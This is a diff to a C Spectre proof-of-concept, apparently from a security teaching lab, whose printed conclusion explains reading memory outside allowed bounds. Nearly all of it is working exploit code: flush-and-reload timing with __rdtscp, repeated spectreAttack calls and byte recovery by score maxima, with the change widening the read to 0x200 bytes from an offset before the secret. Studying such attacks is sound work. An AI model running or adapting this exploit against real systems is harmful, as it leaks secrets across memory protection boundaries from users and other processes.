@@ -40,6 +40,7 @@ int i;
   volatile uint8_t *addr;
   register uint64_t time1, time2;
   int junk = 0;
+  //Iterate over all possible options and test each
   for (i = 0; i < 256; i++) {
     addr = &array[i * 4096 + DELTA];
     time1 = __rdtscp(&junk);
@@ -86,25 +87,32 @@ int main() {
   printf("Conclusion:\n");
   printf("\tWith this methodology, we successfully read data outside of what should be allowed. If none of this makes sense to you, check out the topics of protected memory, branch prediction, speculative execution, and out-of-order execution.\n\n");
   
-  printf("Secret Value: ");
+  printf("Secret Value:\n ");
   int i;
   uint8_t s;
   size_t larger_x = (size_t)(secret-(char*)buffer);
+  printf("%p\n%p\n", larger_x, &secret);
+  larger_x = (size_t)(secret-0x100);
+  printf("%p\n%p\n", larger_x, &secret);
   flushSideChannel();
   int count;
   int len = strlen(secret);
   char result[len];
   setbuf(stdout, NULL);
-  for (count = 0; count < strlen(secret); count++) {
+
+  // Iterate over the length of the string
+  for (count = 0; count < 0x200; count++) {
+	// Reset scores to 0
   	for(i=0;i<256; i++) scores[i]=0;
   	for (i = 0; i < 1000; i++) {
-    	spectreAttack(larger_x + count);
-    	reloadSideChannelImproved();
+	    	spectreAttack(larger_x + count);
+    		reloadSideChannelImproved();
   	}
+	// Index of score maximum
   	int max = 0;
   	for (i = 0; i < 256; i++){
-   	if(scores[max] < scores[i])  
-		max = i;
+	   	if(scores[max] < scores[i])  
+			max = i;
   	}
 	printf("%c", max);
   }
